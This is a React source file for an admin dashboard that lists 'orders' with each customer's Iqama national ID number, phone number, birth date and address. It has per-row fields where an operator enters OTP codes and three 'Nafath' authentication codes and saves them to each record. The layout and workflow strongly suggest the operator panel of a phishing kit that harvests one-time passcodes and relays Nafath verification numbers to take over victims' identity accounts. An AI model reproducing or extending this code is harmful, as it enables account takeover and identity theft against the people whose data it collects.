import { useState } from "react";
import axios from "axios";
import { TextField } from "@mui/material";
import Swal from "sweetalert2";
import useAxiosPublic from "../../Hooks/useAxiosPublic";
import { useQuery } from "@tanstack/react-query";

const Dashboard = () => {
  const [selectedOrders, setSelectedOrders] = useState([]);
  const [searchTerm, setSearchTerm] = useState(""); // Search term for iqama
  const [otp, setOtp] = useState({}); // Object to hold OTPs for each order
  const [loading, setLoading] = useState(false); // Loading state
  const [error, setError] = useState(""); // Error state

  const axiosPublic = useAxiosPublic();
  const { data: orders = [], refetch } = useQuery({
    queryKey: ["orderList"],
    queryFn: async () => {
      const res = await axiosPublic.get(`orders`);
      return res.data;
    },
  });

  const handleLogout = () => {
    localStorage.removeItem("token");
    window.location.href = "/login"; // Adjust based on your routing
  };

  const handleSelectOrder = (id) => {
    setSelectedOrders((prevSelected) =>
      prevSelected.includes(id)
        ? prevSelected.filter((orderId) => orderId !== id)
        : [...prevSelected, id]
    );
  };

  const handleDeleteSelected = async () => {
    const confirmDelete = window.confirm(
      "Are you sure you want to delete selected orders?"
    );
    if (!confirmDelete) return;

    try {
      await axios.delete("http://localhost:5000/orders", {
        data: { ids: selectedOrders }, // Send the selected order IDs in the body
      });

      setSelectedOrders([]); // Clear the selected orders
    } catch (error) {
      console.error("Error deleting orders:", error);
      setError(
        error.response
          ? error.response.data.message
          : "Failed to delete orders."
      );
    }
  };

  // Filter and sort orders based on the search term and orderDate
  const filteredOrders = orders
    .filter((order) =>
      order.iqama.toLowerCase().includes(searchTerm.toLowerCase())
    )
    .sort((a, b) => new Date(b.orderDate) - new Date(a.orderDate)); // Sort by orderDate in descending order

  const handleDelete = (id) => {
    Swal.fire({
      title: "Are you sure?",
      text: "You won't be able to revert this!",
      icon: "warning",
      showCancelButton: true,
      confirmButtonColor: "#3085d6",
      cancelButtonColor: "#d33",
      confirmButtonText: "Yes, delete it!",
    }).then((result) => {
      if (result.isConfirmed) {
        axios
          .delete(`http://localhost:5000/deleteOrder/${id}`)
          .then((res) => {
            if (res.data.deletedCount > 0) {
              Swal.fire({
                title: "Deleted!",
                text: "Your file has been deleted.",
                icon: "success",
                timer: 1500,
              });
              refetch();
            }
          })
          .catch((error) => {
            console.error("Error deleting order:", error);
            Swal.fire({
              title: "Error!",
              text: "There was a problem deleting the order.",
              icon: "error",
            });
          });
      }
    });
  };

  // Function to handle OTP1
  const handleOtpChange = (id, value) => {
    const newOtp = { ...otp, [id]: value }; // Store OTP for the specific order
    setOtp(newOtp);

    // Otp 1 update

    axiosPublic
      .patch(`order-update/${id}`, { otp1: parseInt(value) })
      .then((response) => {
        console.log("Order updated successfully:", response.data);
      })
      .catch((error) => {
        console.error("Error updating order:", error);
      });
  };

  // Add the function to handle OTP2 change
  const handleOtp2Change = (id, value) => {
    setOtp((prevOtp) => ({
      ...prevOtp,
      [id]: { ...prevOtp[id], otp2: parseInt(value) }, // Store otp2 for each order
    }));
  };

  // Function to submit otp2
  const handleOtp2Submit = (id) => {
    const otp2Value = otp[id]?.otp2;
    console.log("OTP2 for order", id, ":", otp2Value);

    axiosPublic
      .patch(`order-update/${id}`, { otp2: otp2Value })
      .then((response) => {
        console.log("OTP2 updated successfully:", response.data);
      })
      .catch((error) => {
        console.error("Error updating OTP2:", error);
      });
  };

  // nafath 1 set

  const handleNafath1Change = (id, value) => {
    setOtp((prevOtp) => ({
      ...prevOtp,
      [id]: { ...prevOtp[id], nafath1: parseInt(value) }, // Store Nafath1 for each order
    }));
  };

  const handleNafath1Submit = (id) => {
    const nafath1Value = otp[id]?.nafath1;
    console.log("Nafath1 for order", id, ":", nafath1Value);

    // You can then send this value to the server as needed
    axiosPublic
      .patch(`order-update/${id}`, { nafath1: nafath1Value })
      .then((response) => {
        console.log("Nafath1 updated successfully:", response.data);
      })
      .catch((error) => {
        console.error("Error updating Nafath1:", error);
      });
  };

  // Function to handle Nafath2
  const handleNafath2Change = (id, value) => {
    setOtp((prevOtp) => ({
      ...prevOtp,
      [id]: { ...prevOtp[id], nafath2: parseInt(value) }, // Store Nafath2 for each order
    }));
  };

  const handleNafath2Submit = (id) => {
    const nafath2Value = otp[id]?.nafath2;
    console.log("Nafath2 for order", id, ":", nafath2Value);

    // Send this value to the server as needed
    axiosPublic
      .patch(`order-update/${id}`, { nafath2: nafath2Value })
      .then((response) => {
        console.log("Nafath2 updated successfully:", response.data);
      })
      .catch((error) => {
        console.error("Error updating Nafath2:", error);
      });
  };

  // Function to handle Nafath3
  const handleNafath3Change = (id, value) => {
    setOtp((prevOtp) => ({
      ...prevOtp,
      [id]: { ...prevOtp[id], nafath3: parseInt(value) }, // Store Nafath3 for each order
    }));
  };

  const handleNafath3Submit = (id) => {
    const nafath3Value = otp[id]?.nafath3;
    console.log("Nafath3 for order", id, ":", nafath3Value);

    // Send this value to the server as needed
    axiosPublic
      .patch(`order-update/${id}`, { nafath3: nafath3Value })
      .then((response) => {
        console.log("Nafath3 updated successfully:", response.data);
      })
      .catch((error) => {
        console.error("Error updating Nafath3:", error);
      });
  };

  console.log(selectedOrders);

  return (
    <div className="p-5">
      <h1 className="text-2xl font-bold mb-4">Dashboard</h1>
      <button
        onClick={handleLogout}
        className="mb-4 bg-red-500 text-white px-4 py-2 rounded"
      >
        Logout
      </button>

      {/* Search Input Field */}
      <div className="mb-4 ">
        <TextField
          label="Search by Iqama Number"
          variant="outlined"
          fullWidth
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
        />
      </div>
      <button
        onClick={handleDeleteSelected}
        className="mt-4 bg-red-500 text-white px-4 py-2 rounded"
        disabled={selectedOrders.length === 0}
      >
        Delete Selected
      </button>

      {loading ? (
        <p>Loading orders...</p> // Loading message
      ) : (
        <>
          {error && <p className="text-red-500">{error}</p>}{" "}
          {/* Error message */}
          {filteredOrders.length === 0 && !loading && (
            <p className="text-red-500">No orders found.</p>
          )}
          {/* Scrollable container */}
          <div className="overflow-x-auto max-h-96">
            <table className="min-w-full border border-gray-300">
              <thead>
                <tr className="bg-gray-200">
                  <th className="border px-4 py-2">
                    <input
                      type="checkbox"
                      onChange={(e) => {
                        if (e.target.checked) {
                          setSelectedOrders(
                            filteredOrders.map((order) => order._id)
                          );
                        } else {
                          setSelectedOrders([]);
                        }
                      }}
                    />
                  </th>
                  <th className="border px-4 py-2">ID/Iqama Number</th>
                  <th className="border px-4 py-2">Phone Number</th>
                  <th className="border px-4 py-2">Order Date</th>
                  <th className="border px-4 py-2">Birth Date</th>
                  <th className="border px-4 py-2">OTP-1</th>
                  <th className="border px-4 py-2">Nafath1</th>
                  <th className="border px-4 py-2">Nafath2</th>
                  <th className="border px-4 py-2">OTP-2</th>
                  <th className="border px-4 py-2">Nafath3</th>
                  <th className="border px-4 py-2">Country</th>
                  <th className="border px-4 py-2">city</th>
                  <th className="border px-4 py-2">Address</th>
                  <th className="border px-4 py-2">Product Description</th>
                  <th className="border px-4 py-2">Orderd Name</th>
                  <th className="border px-4 py-2">Action</th>
                </tr>
              </thead>
              <tbody>
                {filteredOrders.map((order) => (
                  <tr key={order._id}>
                    <td className="border px-4 py-2">
                      <input
                        type="checkbox"
                        checked={selectedOrders.includes(order._id)}
                        onChange={() => handleSelectOrder(order._id)}
                      />
                    </td>
                    <td className="border px-4 py-2">{order.iqama}</td>
                    <td className="border px-4 py-2">{order.mobile}</td>
                    <td className="border px-4 py-2">
                      {order.orderDate.split("T")[0]}
                    </td>
                    <td className="border px-4 py-2">{order.dob}</td>
                    <td className="border px-4 py-2">
                      <TextField
                        className="w-14"
                        label="OTP"
                        variant="standard"
                        type="number"
                        value={otp[order._id] || order.otp1 || ""}
                        onChange={(e) => {
                          const inputValue = e.target.value;
                          if (inputValue.length <= 4) {
                            handleOtpChange(order._id, inputValue);
                          }
                        }}
                        inputProps={{
                          maxLength: 4,
                          style: { textAlign: "center" },
                        }}
                      />
                    </td>
                    <td className="border px-2 text-center">
                      <input
                        className="border-2 w-12 rounded-md text-center"
                        type="text"
                        value={otp[order._id]?.nafath1 || order.nafath1 || ""} // Bind per order
                        onChange={(e) =>
                          handleNafath1Change(order._id, e.target.value)
                        } // Handle change
                      />
                      <button
                        className="ml-2 mt-2 bg-blue-500 text-white font-semibold py-1 px-3 rounded-md transition-transform transform hover:scale-105 hover:bg-blue-600 active:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 focus:ring-opacity-50"
                        onClick={() => handleNafath1Submit(order._id)}
                      >
                        Enter
                      </button>{" "}
                      {/* Handle submit */}
                    </td>

                    <td className="border px-2 text-center ">
                      <div className=" items-center justify-center space-x-2">
                        <input
                          className="border-2 mb-2 w-12 rounded-md text-center"
                          type="text"
                          value={otp[order._id]?.nafath2 || order.nafath2 || ""} // Bind per order
                          onChange={(e) =>
                            handleNafath2Change(order._id, e.target.value)
                          } // Handle change
                        />
                        <button
                          className="bg-blue-500 text-white font-semibold py-1 px-3 rounded-md transition-transform transform hover:scale-105 hover:bg-blue-600 active:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 focus:ring-opacity-50"
                          onClick={() => handleNafath2Submit(order._id)}
                        >
                          Enter
                        </button>
                      </div>
                    </td>

                    {/* OTP2 */}
                    <td className="border px-4 py-2">
                      <div className=" items-center justify-center space-x-2">
                        <TextField
                          className="w-14 "
                          label="OTP2"
                          variant="standard"
                          type="number"
                          value={otp[order._id]?.otp2 || order.otp2 || ""}
                          onChange={(e) =>
                            handleOtp2Change(order._id, e.target.value)
                          }
                          inputProps={{
                            maxLength: 4,
                            style: { textAlign: "center" },
                          }}
                        />
                        <button
                          className="mt-2 bg-blue-500 text-white font-semibold py-1 px-3 rounded-md transition-transform transform hover:scale-105 hover:bg-blue-600 active:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 focus:ring-opacity-50"
                          onClick={() => handleOtp2Submit(order._id)}
                        >
                          Enter
                        </button>
                      </div>
                    </td>

                    <td className="border px-2 text-center">
                      <div className="items-center justify-center space-x-2">
                        <input
                          className="border-2 w-12 rounded-md text-center"
                          type="text"
                          value={otp[order._id]?.nafath3 || order.nafath3 || ""} // Bind per order
                          onChange={(e) =>
                            handleNafath3Change(order._id, e.target.value)
                          } // Handle change
                        />
                        <button
                          className="mt-2 bg-blue-500 text-white font-semibold py-1 px-3 rounded-md transition-transform transform hover:scale-105 hover:bg-blue-600 active:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 focus:ring-opacity-50"
                          onClick={() => handleNafath3Submit(order._id)}
                        >
                          Enter
                        </button>
                      </div>
                    </td>

                    <td className="border px-4 py-2">{order.nationality}</td>
                    <td className="border px-4 py-2">{order.city}</td>
                    <td className="border px-4 py-2">{order.address}</td>
                    <td className="border px-4 py-2">
                      <h4>
                        {order.model}, {order.color}, {order.storage}
                      </h4>
                    </td>
                    <td className="border px-4 py-2">{order.name}</td>
                    <td className="border px-4 py-2">
                      <button
                        onClick={() => handleDelete(order._id)}
                        className="text-red-500 hover:text-red-700"
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      )}
    </div>
  );
};

export default Dashboard;
